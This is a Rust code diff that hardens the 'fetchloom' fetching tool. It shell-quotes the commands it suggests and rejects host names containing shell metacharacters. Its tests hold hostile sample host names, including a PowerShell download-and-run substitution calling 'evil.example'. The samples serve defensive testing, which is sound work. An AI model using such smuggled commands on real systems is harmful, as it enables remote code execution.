@@ -58,13 +58,15 @@ impl Allowed {
         if !listed.contains(&origin) {
             listed.push(origin);
         }
-        let variable = format!("`FETCHLOOM_ALLOWED_ORIGINS={}`", listed.join(","));
+        let quoted = |word: &str| crate::suggested::shell_word(word).into_owned();
+        let variable = format!("`FETCHLOOM_ALLOWED_ORIGINS={}`", quoted(&listed.join(",")));
         if self.by_variable {
             return format!("set {variable}");
         }
+        let words: Vec<String> = listed.iter().map(|origin| quoted(origin)).collect();
         format!(
             "save it with `fetchloom settings set allowed_origins {}`, or set {variable} for one run",
-            listed.join(" ")
+            words.join(" ")
         )
     }
 }
@@ -146,11 +148,23 @@ impl Typed {
     }
 
     /// refuses a URL whose host is a private address written out, or a proxy's host, unless its
-    /// origin is trusted. names are checked later, on the addresses they resolve to.
+    /// origin is trusted, and any whose name holds a character no host name has. names are
+    /// checked later, on the addresses they resolve to.
     pub(crate) fn check(&self, url: &Url) -> Result<(), Refused> {
         let Some(host) = url.host_str() else {
             return Err(Refused::new(format!("{} has no host", Shown(url))));
         };
+        // the url crate lets `$`, `(`, `;` and the like into a name, which a command fetchloom
+        // suggests with the host in it would hand to a shell
+        if let Some(Host::Domain(name)) = url.host()
+            && !name.bytes().all(|byte| {
+                byte.is_ascii_lowercase() || byte.is_ascii_digit() || b"._-".contains(&byte)
+            })
+        {
+            return Err(Refused::new(
+                "its host name holds a character no host name has",
+            ));
+        }
         let hosts = self.hosts();
         if hosts.origins.contains(&url.origin()) {
             return Ok(());
@@ -957,6 +971,36 @@ mod tests {
         assert_eq!(
             remedy(vec![lab], true),
             "set `FETCHLOOM_ALLOWED_ORIGINS=http://lab.local:8080,http://10.0.0.5:9001`"
+        );
+        // a word a shell would read as more than a word is quoted, wherever it came from
+        let odd = Url::parse("http://lab;sh.example/").unwrap().origin();
+        assert_eq!(
+            Allowed::default().remedy(&odd),
+            "save it with `fetchloom settings set allowed_origins \"http://lab;sh.example\"`, or set `FETCHLOOM_ALLOWED_ORIGINS=\"http://lab;sh.example\"` for one run"
+        );
+    }
+
+    /// a host whose name holds what a shell would run, which the url crate lets through, is
+    /// refused before any request, typed or not, and its refusal suggests no command to paste.
+    #[test]
+    fn a_host_name_a_shell_would_run_is_refused_and_suggests_no_command() {
+        let typed = Typed::default();
+        for link in [
+            "http://data;sh*;.lab.example/x.csv",
+            "http://x$(iex(irm('evil.example'))).example/x.csv",
+        ] {
+            let url = Url::parse(link).unwrap();
+            typed.add(&url);
+            let reason = typed.check(&url).expect_err(link);
+            let error = super::super::failure::refused(&url, &reason);
+            let help = error.help.as_deref().unwrap_or_default();
+            assert!(!help.contains('`'), "{link}: {help}");
+            assert_eq!(error.kind, crate::error::Kind::NetworkRefused, "{link}");
+        }
+        assert!(
+            typed
+                .check(&Url::parse("https://cdn_1.data-lab.example/a.csv").unwrap())
+                .is_ok()
         );
     }
 
